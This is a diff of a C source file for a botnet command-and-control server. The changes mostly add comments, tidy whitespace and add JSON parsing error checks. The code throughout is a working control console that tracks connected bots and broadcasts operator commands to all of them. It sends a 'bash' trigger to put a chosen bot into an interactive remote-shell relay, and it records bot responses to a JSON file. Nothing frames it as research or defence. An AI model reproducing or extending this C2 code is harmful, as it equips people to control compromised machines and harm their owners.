@@ -2,12 +2,6 @@
 // to compile: gcc server.c -o server -lpthread -ljson-c
 // json-c can be installed using the package libjson-c-dev (debian) or json-c-devel (red hat)
 
-/*
-TODO:
-    Full input sanitisation.
-    Cleanly exit
-*/
-
 #include "simple_networking.h"
 #include <poll.h>
 #include <pthread.h>
@@ -16,8 +10,7 @@ TODO:
 #include <json-c/json.h>
 #include <time.h>
 
-
-
+// Configurable settings
 #define SERVER_PORT 8881
 #define TIMEOUT_VALUE 120
 
@@ -57,6 +50,7 @@ int main(void)
 
     // Create thread to control botnet
     pthread_create(&control_thread, NULL, bot_command, &client_con);
+    // Create thread t handle incomming connections
     pthread_create(&connection_thread, NULL, handle_connection, &client_con);
 
     // Wait for threads to finish
@@ -78,7 +72,6 @@ void *handle_connection(void *arg)
 
     while (1)
     {
-
         connection *current = head;
 
         while (current != NULL)
@@ -120,7 +113,7 @@ void *handle_connection(void *arg)
                         new_con->pfds->fd = new_fd;
                         new_con->pfds->events = POLLIN;
 
-                        // get client ip (beej)
+                        // get client ip orig. implementation from beej - (https://beej.us/guide/bgnet/html/#getpeernameman)
                         socklen_t len;
                         struct sockaddr_storage addr;
                         char ipstr[INET_ADDRSTRLEN];
@@ -165,10 +158,10 @@ void *handle_connection(void *arg)
     //return;
 }
 
+// This function handles interaction with server and connected clients
 void *bot_command(void *arg)
 
 {
-
     char data[1024];
     char json[4];
     int rc = 0;
@@ -183,7 +176,6 @@ void *bot_command(void *arg)
 
     while (1)
     {
-
         // Prompt user for input and remove trailing newline
         // Indicate user is in 'console' control
         printf("[Console] >> ");
@@ -193,12 +185,10 @@ void *bot_command(void *arg)
         // print help screen for commands to use in 'console'
         if (strcmp(data, "help") == 0)
         {
-
             print_help_screen();
         }
 
         // Display current list of connections
-        // John is working to store host names, rather than client 1, 2, 3, etc..
         else if (strcmp(data, "show") == 0)
         {
             // Set lock
@@ -244,10 +234,8 @@ void *bot_command(void *arg)
                 }
 
                 // Display current list of connections
-                // Currently unsure how to format this feature into a function...
                 else if (strcmp(data, "show") == 0)
                 {
-
                     // Set lock
                     pthread_mutex_lock(&mutex);
 
@@ -283,6 +271,7 @@ void *bot_command(void *arg)
                         fgets(data, sizeof(data), stdin);
                         data[strcspn(data, "\n")] = 0;
 
+                        // Exit sending to all clients
                         if (strcmp(data, "back") == 0)
                         {
                             break;
@@ -297,7 +286,9 @@ void *bot_command(void *arg)
                         json[strcspn(json, "\n")] = 0;
                         while (tmp != NULL)
                         {
+                            // Send input command
                             send(tmp->pfds->fd, data, sizeof(data), 0);
+
                             // Limit the length of the data string
                             char *trunc_data = malloc(24);
                             strncpy(trunc_data, data, 20);
@@ -306,6 +297,7 @@ void *bot_command(void *arg)
                                 strcat(trunc_data, "...");
                             }
                         
+                            // Print to confirm which client command was sent to
                             printf("[+] Sent %s to %s\n", trunc_data, tmp->hostname);
 
                             // Wait for a response
@@ -325,6 +317,8 @@ void *bot_command(void *arg)
 
                             // Data returned from client
                             recieved_data[bytes_recv] = '\0';
+
+                            // Write output to .json file if desired. Default output to terminal.
                             if (json[0] == 'y' || json[0] == 'Y') {
                                 output_to_json(tmp, recieved_data, data);
                             }
@@ -333,6 +327,7 @@ void *bot_command(void *arg)
                                 printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
                             }
 
+                            // Move to next connection
                             tmp = tmp->next;
                         }
                     }
@@ -346,6 +341,8 @@ void *bot_command(void *arg)
                     fgets(data, sizeof(data), stdin);
                     data[strcspn(data, "\n")] = 0;
                     int num = atoi(data);
+
+                    // Exit sending to single client
                     if (strcmp(data, "back") == 0)
                     {
                         continue;
@@ -367,8 +364,10 @@ void *bot_command(void *arg)
                         tmp = tmp->next;
                         i++;
                     }
+
                     printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                     printf("[+] To escape raw mode, type exit\n");
+
                     // Send trigger word 'bash' to client to force client to enter bash mode
                     send(tmp->pfds->fd, "bash", 5, 0);
 
@@ -397,6 +396,7 @@ void *bot_command(void *arg)
                             break;
                         }
 
+                        // Exit if select returns error
                         if (select_return == -1)
                         {
                             perror("[-] Unable to enter raw mode. select() returned: ");
@@ -410,7 +410,8 @@ void *bot_command(void *arg)
                             {
                                 // Reset input, no bugs were here yet but I thought it might be a good idea...
                                 memset(input, '\0', 250);
-                                // TODO make this variable length
+
+                                // Read from socket, store return value for error checking
                                 select_return = read(tmp->pfds->fd, input, sizeof(input));
                                 if (select_return > 0)
                                 {
@@ -419,6 +420,7 @@ void *bot_command(void *arg)
                                 }
                                 else if (select_return < 0)
                                 {
+                                    // Print error and exit if error on read()
                                     perror("[-] Unable to read from client.");
                                     safe_exit = 1;
                                     break;
@@ -446,6 +448,7 @@ void *bot_command(void *arg)
                                 }
                                 else if (select_return < 0)
                                 {
+                                    // Print error and exit if error on write()
                                     perror("[-] Unable to send to client.");
                                     safe_exit = 1;
                                     break;
@@ -468,6 +471,7 @@ void *bot_command(void *arg)
         {
             while (1)
             {
+                // Prompt to check exit is intentional
                 printf("Are you sure? y/N: ");
                 fgets(data, sizeof(data), stdin);
                 data[strcspn(data, "\n")] = 0;
@@ -477,7 +481,6 @@ void *bot_command(void *arg)
                     exit(0);
                 }
                 break;
-
             }
         }
     }
@@ -489,10 +492,11 @@ void **get_time(char *buff)
     time_t currentTime;
     struct tm *convertedTime;
 
-
+    // Get time (epoch) and convert to local time
     currentTime = time(NULL);
     convertedTime = localtime(&currentTime);
 
+    // Format time (HH:MM AM/PM) and store in buff
     strftime(buff, 100, "%I:%M %p", convertedTime);
 }
 
@@ -502,9 +506,11 @@ void **get_date(char *buff)
     time_t currentTime;
     struct tm *convertedTime;
 
+    // Get time (epoch) and convert to local
     currentTime = time(NULL);
     convertedTime = localtime(&currentTime);
 
+    // Format time to hold date (DD/MM/YY) and store in buff
     strftime(buff, 100, "%d/%m/%y", convertedTime);
 }
 
@@ -512,18 +518,25 @@ void **get_date(char *buff)
 json_object *parse_json_file(FILE *fp)
 {
     char *buffer;
+    int stringlen;
 
-    // Create json object
+    // Create json object for parsing and error checking
     json_object *parsed_json = json_object_new_object();
+    json_tokener *token = json_tokener_new();
 
-    if (fp != NULL) {
+    // Create error token for checking file read contains valid json values
+    enum json_tokener_error errorToken;
+
+    if (fp != NULL) 
+    {
         // Seek to end of file
-        if (fseek(fp, 0, SEEK_END) == 0) {
+        if (fseek(fp, 0, SEEK_END) == 0) 
+        {
             // Return size of file
             long size = ftell(fp);
 
             // Assign memory to buffer based on size of file
-            buffer = malloc(sizeof(char) * (size + 1));
+            buffer = malloc(size + 1);
             
             // Return to beginning of file
             fseek(fp, 0, SEEK_SET);
@@ -536,10 +549,21 @@ json_object *parse_json_file(FILE *fp)
         }
     }
 
-    // Parse contents of buffer to json_object
-    parsed_json = json_tokener_parse(buffer);
+    // Store length of string held in buffer
+    stringlen = strlen(buffer);
 
-    // Return json object
+    // Parse contents of buffer to json_object and store error/success token
+    parsed_json = json_tokener_parse_ex(token, buffer, stringlen);
+
+    // Check if token returned was success
+    if ((errorToken = json_tokener_get_error(token)) != json_tokener_success)
+    {
+        // errorToken does not hold success - print description of error to stderr and return NULL
+        fprintf(stderr, "[-] Error. %s\n", json_tokener_error_desc(errorToken));
+        return NULL;
+    }
+ 
+    // Success - Return json object
     return parsed_json;
 }
 
@@ -559,6 +583,7 @@ json_object *build_json_object()
     json_object_object_add(jsonObject,"type", objectType);
     json_object_object_add(jsonObject,"returned results", outputsArray);
 
+    // Return skeleton json object for appending to
     return jsonObject;
 
 }
@@ -566,10 +591,11 @@ json_object *build_json_object()
 // Function to append information to json object
 void append_json_object(json_object *passedJsonObject, connection *client, char *dataRecieved, char *inputCmd)
 {
-    // Create date and time values
+    // Create date and time buffers
     char *timeBuffer = malloc(10);
     char *dateBuffer = malloc(10);
 
+    // Assign date and time values to buffers
     get_time(timeBuffer);
     get_date(dateBuffer);
 
@@ -584,7 +610,7 @@ void append_json_object(json_object *passedJsonObject, connection *client, char 
     json_object *date = json_object_new_string(dateBuffer);
     json_object *ipAddr = json_object_new_string(client->dest_ip);
 
-    // Add to 'properties' object
+    // Add properties' data to object
     json_object_object_add(propertiesObject, "hostname", hostName);
     json_object_object_add(propertiesObject, "input command", cmdName);
     json_object_object_add(propertiesObject, "time", time);
@@ -595,7 +621,7 @@ void append_json_object(json_object *passedJsonObject, connection *client, char 
     json_object *returnedObject = json_object_new_object();
     json_object *results = json_object_new_string(dataRecieved);
 
-    // Add to 'returned' object
+    // Add to returned data to object
     json_object_object_add(returnedObject, "results", results);
 
     // Add both properties and returned objects to 'main' object
@@ -604,7 +630,12 @@ void append_json_object(json_object *passedJsonObject, connection *client, char 
 
     // Get reference to json array object and store in array var
     struct json_object *array;
-    json_object_object_get_ex(passedJsonObject, "returned results", &array);
+    if (!json_object_object_get_ex(passedJsonObject, "returned results", &array))
+    {
+        // Data in file did not contain key value "returned results"
+        printf("[-] Error. Key not found. Ensure file contains correct data.\n");
+        return;
+    }
 
     // Add 'main' object to array
     json_object_array_add(array, jsonObject);
@@ -615,11 +646,18 @@ void output_to_json(connection *client, char *dataRecieved, char *inputCmd)
 {
     FILE *jsonFile;
 
-    if ((jsonFile = fopen("outputs.json", "r+"))) {
+    // Check if we can open file this will determine if it exists or not
+    if ((jsonFile = fopen("outputs.json", "r+"))) 
+    {
         // file exists
-
-        // Parse json file in to json object
         json_object *parsed_json_object = parse_json_file(jsonFile);
+        // Parse json file in to json object
+        if (parsed_json_object == NULL)
+        {
+            printf("[-] Bad data in file. Delete file and try again.\n");
+            fclose(jsonFile);
+            return;
+        }
 
         // Close file that's opened in read mode
         fclose(jsonFile);
@@ -631,10 +669,11 @@ void output_to_json(connection *client, char *dataRecieved, char *inputCmd)
         jsonFile = fopen("outputs.json", "w");
         fprintf(jsonFile, "%s", json_object_to_json_string(parsed_json_object));
     }
-    else {
+    else 
+    {
         // file doesnt exist
 
-        // Create new json object
+        // Create new json skeleton object
         json_object *newJsonObject = build_json_object();
 
         // Append output results to json object
@@ -651,6 +690,7 @@ void output_to_json(connection *client, char *dataRecieved, char *inputCmd)
 // Function to print welcome screen
 void print_welcome_message()
 {
+    // Clear terminal screen
     system("clear");
 
     printf("\n******************************************************************************\n");
